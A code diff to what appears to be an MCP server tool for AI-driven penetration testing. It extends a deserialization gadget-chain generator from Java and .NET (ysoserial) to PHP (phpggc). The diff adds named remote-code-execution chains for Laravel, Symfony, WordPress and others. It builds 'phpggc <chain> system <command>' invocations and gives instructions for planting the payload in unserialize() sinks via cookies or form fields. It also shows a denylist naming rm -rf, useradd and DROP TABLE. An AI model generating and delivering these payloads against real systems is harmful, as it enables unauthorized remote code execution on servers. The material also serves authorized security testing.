@@ -103,21 +103,25 @@ def register(mcp: FastMCP):
         encode: str = "base64",
         timeout: int = 60,
     ) -> str:
-        """Generate a deserialization gadget chain via ysoserial / ysoserial.net.
+        """Generate a deserialization gadget chain via ysoserial / ysoserial.net / phpggc.
 
         Payload GENERATOR only — does NOT send. Operator pipes the output into
         curl_request / send_raw_request / session_request via the vulnerable
-        sink (Java ObjectInputStream, .NET BinaryFormatter, etc.). Per Rule 5
-        and the confirm_* safety contract, `command` is filtered against the
-        HARD_DESTRUCTIVE denylist (rm -rf, useradd, DROP TABLE blocked).
+        sink (Java ObjectInputStream, .NET BinaryFormatter, PHP unserialize,
+        etc.). Per Rule 5 and the confirm_* safety contract, `command` is
+        filtered against the HARD_DESTRUCTIVE denylist (rm -rf, useradd,
+        DROP TABLE blocked).
 
         Args:
-            language: java | dotnet
+            language: java | dotnet | php
             gadget: Java: CommonsCollections1..7, Spring1, Spring2, ROME,
                 Hibernate1..2, etc. .NET: TypeConfuseDelegate,
-                ActivitySurrogateSelector, WindowsIdentity, etc.
+                ActivitySurrogateSelector, WindowsIdentity, etc. PHP (phpggc
+                chain names): Laravel/RCE1, Symfony/RCE4, Monolog/RCE1,
+                Guzzle/RCE1, WordPress/RCE1, etc. — run `phpggc -l`.
                 Empty = print available gadget list.
             command: Command for the gadget to run on deserialize. Default 'id'.
+                PHP RCE chains run it via `system` (phpggc <chain> system <cmd>).
                 HARD_DESTRUCTIVE patterns refused at tool layer.
             encode: base64 | raw | hex (default base64)
             timeout: Max seconds for the generator process (default 60)
@@ -128,8 +132,8 @@ def register(mcp: FastMCP):
         )
 
         lang = language.lower().strip()
-        if lang not in {"java", "dotnet", ".net"}:
-            return f"Unknown language '{language}'. Use 'java' or 'dotnet'."
+        if lang not in {"java", "dotnet", ".net", "php"}:
+            return f"Unknown language '{language}'. Use 'java', 'dotnet', or 'php'."
         if lang == ".net":
             lang = "dotnet"
 
@@ -152,6 +156,21 @@ def register(mcp: FastMCP):
             else:
                 base = ["ysoserial"] if _check_tool("ysoserial") else ["java", "-jar", jar]
                 cmd = base + [gadget, command]
+        elif lang == "php":
+            tool = "phpggc"
+            if not _check_tool("phpggc") and not _check_tool("php"):
+                return (
+                    "Error: phpggc not installed.\n"
+                    "  git clone https://github.com/ambionics/phpggc\n"
+                    "  Then symlink `phpggc` into PATH, or run from its dir.\n"
+                    "  https://github.com/ambionics/phpggc"
+                )
+            base = ["phpggc"] if _check_tool("phpggc") else ["php", "phpggc"]
+            if not gadget:
+                cmd = base + ["-l"]
+            else:
+                # phpggc RCE chains take <function> <arg>; `system` runs command.
+                cmd = base + [gadget, "system", command]
         else:  # dotnet
             if not _check_tool("ysoserial.exe") and not _check_tool("ysoserial.net"):
                 return (
@@ -204,6 +223,8 @@ def register(mcp: FastMCP):
         lines.append("  - Java: POST as body to ObjectInputStream sink, or stuff into a")
         lines.append("    Cookie / Header value the app deserialises")
         lines.append("  - .NET: BinaryFormatter / NetDataContractSerializer / LosFormatter sink")
+        lines.append("  - PHP: feed into the unserialize() sink — cookie / hidden field / body")
+        lines.append("    the app passes to unserialize(); url-encode if the sink is a GET/POST param")
         lines.append("  - Verify exec via confirm_rce() with use_collaborator=True if response is opaque")
         if stderr:
             lines.append("")
